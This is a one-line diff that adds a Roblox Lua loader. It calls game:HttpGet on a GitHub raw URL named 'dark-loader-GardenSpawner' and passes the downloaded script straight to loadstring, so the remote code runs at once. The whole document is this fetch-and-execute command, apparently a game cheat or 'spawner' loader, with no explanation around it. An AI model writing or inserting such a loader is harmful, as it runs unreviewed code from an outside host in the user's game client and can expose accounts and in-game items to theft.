@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-01/dark-loader-GardenSpawner/refs/heads/main/Load"))()
